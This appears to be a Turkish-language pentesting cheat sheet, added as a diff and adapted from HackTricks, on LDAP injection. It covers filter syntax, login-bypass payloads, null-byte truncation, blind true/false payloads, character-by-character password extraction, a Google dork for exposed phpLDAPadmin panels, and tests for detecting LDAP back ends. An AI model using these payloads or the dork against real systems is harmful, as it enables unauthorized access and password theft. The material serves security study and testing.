@@ -1,0 +1,424 @@
+LDAP Injection Nedir?
+
+LDAP Injection, kullanıcı girdilerinden LDAP sorguları oluşturan web uygulamalarını hedef alan bir saldırı türüdür.
+Uygulama, kullanıcıdan gelen girdileri doğru şekilde filtrelemez veya temizlemezse, saldırgan bu girdiler üzerinden LDAP filtrelerini manipüle edebilir.
+
+Bu sayede:
+
+- Yetkisiz erişim sağlanabilir
+- Kimlik doğrulama atlatılabilir
+- LDAP veritabanındaki bilgiler okunabilir veya manipüle edilebilir
+
+Saldırılar genellikle yerel bir proxy (Burp, ZAP vb.) üzerinden yapılır.
+
+
+LDAP Filtre Yapısı
+
+LDAP filtreleri parantezler ve mantıksal operatörler ile çalışır.
+
+Filter        = (filtercomp)
+Filtercomp    = AND / OR / NOT / Item
+
+
+Mantıksal Operatörler
+
+AND (&)   -> tüm koşullar doğru olmalı
+OR  (|)   -> en az bir koşul doğru olmalı
+NOT (!)  -> koşulun tersi
+
+
+Filtre Listesi
+
+filterlist = 1 veya daha fazla filter
+
+
+LDAP Öğeleri (Item)
+
+Item = Simple / Present / Substring
+
+
+Simple
+
+attribute filtertype value
+
+
+Filter Type
+
+=   eşittir
+~=  yaklaşık eşleşme
+>=  büyük veya eşit
+<=  küçük veya eşit
+
+
+Present
+
+attribute=*
+
+
+Substring
+
+attribute = [başlangıç]*[son]
+
+
+Mantıksal Sabitler
+
+(&)  -> Mutlak TRUE
+(|)  -> Mutlak FALSE
+
+
+Örnek LDAP Filtreleri
+
+(&(!(objectClass=Impresoras))(uid=s*))
+(&(objectClass=user)(uid=*))
+
+
+Bu filtreler LDAP dizinindeki nesneleri filtrelemek için kullanılır.
+
+
+LDAP Sunucu Türleri ve Davranışları
+
+LDAP Injection sırasında sunucu türü çok önemlidir:
+
+OpenLDAP
+- Birden fazla filtre gelirse sadece ilkini çalıştırır
+
+ADAM / Microsoft LDS
+- Birden fazla filtre gelirse hata verir
+
+SunOne Directory Server 5.0
+- Birden fazla filtreyi de çalıştırır
+
+
+⚠️ Bu yüzden doğru sözdizimi kritik önemdedir.
+⚠️ Hata almamak için tek filtre göndermek daha güvenlidir.
+
+
+Doğru Filtre Başlangıcı
+
+LDAP filtresi mutlaka aşağıdakilerden biriyle başlamalıdır:
+
+&
+|
+
+
+Örnek
+
+(&(directory=val1)(folder=public))
+(&(objectClass=VALUE1)(type=Epson*))
+
+
+LDAP Injection Örneği
+
+VALUE1 = *)(objectClass=*))(&(objectClass=void
+
+
+Bu değer filtreye enjekte edildiğinde oluşan sorgu:
+
+(&(objectClass=*)(objectClass=*))(&(objectClass=void))
+
+
+Sunucuya göre ilk filtre çalıştırılır, diğerleri yok sayılabilir.
+
+
+Giriş (Login) Atlatma
+
+LDAP, parolaları farklı formatlarda saklayabilir:
+
+plaintext, md5, smd5, sha1, sha, crypt
+
+
+Ancak parola hashli olsa bile LDAP Injection mümkündür.
+
+
+Basit Atlatma
+
+user=*
+password=*
+
+
+Oluşan sorgu:
+
+(&(user=*)(password=*))
+
+
+* LDAP Injection için çok kritiktir.
+
+
+Payload Örnekleri
+
+user=*)(&
+password=*)(&
+
+--> (&(user=*)(&)(password=*)(&))
+
+
+user=*)(|(&
+pass=pwd)
+
+--> (&(user=*)(|(&)(pass=pwd))
+
+
+user=*)(|(password=*
+password=test)
+
+--> (&(user=*)(|(password=*)(password=test))
+
+
+NULL Byte Atlatma
+
+user=*))%00
+pass=any
+
+--> (&(user=*))%00
+
+
+NULL byte sonrası sorgu çalışmaz.
+
+
+Mantıksal Atlatma Örneği
+
+username=admin)(!(&(|
+pass=any))
+
+
+Oluşan sorgu:
+
+(&(uid=admin)(!(&(|)(webpassword=any))))
+
+
+(|) FALSE olduğu için:
+
+NOT(FALSE) = TRUE
+
+parola kontrolü geçilmiş olur
+
+
+Kör LDAP Injection (Blind LDAPi)
+
+Uygulama veri döndürmüyorsa doğru / yanlış tepkiler üzerinden test yapılır.
+
+
+TRUE Döndüren Payload
+
+*)(objectClass=*))(&objectClass=void
+
+(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=Pepi*))
+
+
+Sonuç: TRUE → veri gösterilir
+
+
+FALSE Döndüren Payload
+
+void)(objectClass=void))(&objectClass=void
+
+(&(objectClass=void)(objectClass=void))(&(objectClass=void)(type=Pepi*))
+
+
+Sonuç: FALSE → veri gösterilmez
+
+
+Veri Sızdırma (Brute Force)
+
+Karakter karakter deneme yapılır:
+
+(&(sn=administrator)(password=*))   -> OK
+(&(sn=administrator)(password=A*))  -> KO
+(&(sn=administrator)(password=B*))  -> KO
+...
+(&(sn=administrator)(password=M*))  -> OK
+(&(sn=administrator)(password=MA*)) -> KO
+
+
+Bu şekilde parola adım adım çıkarılır.
+
+
+LDAP Attribute Keşfi (Script Mantığı)
+
+LDAP nesneleri birçok varsayılan attribute içerir.
+
+İşleyiş:
+
+- Attribute listesi alınır
+- Her attribute denenir
+- Her karakter ASCII üzerinden brute-force edilir
+- TRUE cevapta karakter kabul edilir
+
+
+Özel Kör LDAP Injection (Wildcard Yok)
+
+admin*)(password=FLAG_CHAR)
+
+
+TRUE cevap gelirse karakter doğrudur ve flag büyütülür.
+
+
+Google Dork
+
+intitle:"phpLDAPadmin" inurl:cmd.php
+
+
+Açık LDAP yönetim panellerini bulmak için kullanılır.
+
+
+Bir Uygulamanın LDAP Kullandığını Nasıl Anlarız?
+
+Bunu tek bir işaretle değil, birkaç belirtiyi birleştirerek anlarsın.
+
+
+1️⃣ Hata Mesajları (En Net İpucu)
+
+Yanlış veya bozuk girişler gönder, LDAP’e özgü hataları ara.
+
+
+Örnek Payload
+
+username=*
+password=*
+
+
+LDAP’e Özgü Hatalar
+
+LDAPException
+javax.naming.NameNotFoundException
+javax.naming.directory.InvalidSearchFilterException
+LDAP: error code 87
+Unbalanced parenthesis
+Bad search filter
+
+
+SQL olsaydı SQL syntax, mysql_fetch, ORA- gibi şeyler görürdün.
+
+
+2️⃣ Parantez Testi (LDAP Filter Yapısı)
+
+LDAP ( ) parantezlerine aşırı duyarlıdır.
+
+
+Test
+
+username=(
+password=test
+
+
+Sonuç
+
+LDAP → hata verir
+SQL → çoğu zaman umursamaz
+
+
+3️⃣ LDAP Wildcard Testi (*)
+
+LDAP’te * çok özel bir anlam taşır.
+
+
+Test
+
+username=*
+password=*
+
+
+Muhtemel Sonuçlar
+
+Giriş başarılı / farklı cevap → LDAP ihtimali yüksek
+Hiçbir değişiklik yok → emin değiliz
+
+
+4️⃣ Mantıksal Operatör Testi (& | !)
+
+LDAP mantıksal operatörleri tek karakterlidir.
+
+
+Test
+
+username=*)(|
+password=test
+
+
+Eğer:
+
+- Hata değişiyorsa
+- Cevap süresi / mesajı değişiyorsa
+
+→ LDAP filtresi parse ediliyordur.
+
+
+5️⃣ NULL Byte Testi (%00)
+
+LDAP ve C tabanlı bazı sistemler NULL byte’tan etkilenir.
+
+
+Test
+
+username=admin)%00
+password=any
+
+
+Sonuç
+
+Sorgu kesiliyorsa → LDAP veya düşük seviye dizin işlemi olabilir
+
+
+6️⃣ Yanlış Filtre Testi (Bilerek Boz)
+
+LDAP filtre sözdizimi bozulunca kesin hata verir.
+
+
+Test
+
+username=admin)(
+password=test
+
+
+LDAP’te:
+
+Invalid filter
+Bad search filter
+
+
+7️⃣ Boolean Davranış Testi (TRUE / FALSE)
+
+LDAP Injection tespitinde çok güçlüdür.
+
+
+TRUE Payload
+
+username=*)(objectClass=*)
+
+
+FALSE Payload
+
+username=*)(objectClass=void)
+
+
+Eğer:
+
+TRUE → farklı cevap
+FALSE → farklı cevap
+
+→ LDAP arama filtresi çalışıyor demektir.
+
+
+8️⃣ Attribute Testi
+
+LDAP’e özgü alanları dene:
+
+uid
+cn
+sn
+objectClass
+mail
+userPassword
+
+
+Test
+
+username=*)(uid=*)
+
+
+Eğer davranış değişiyorsa → LDAP ihtimali çok yüksek.
+
+
+Kaynak
+
+https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html
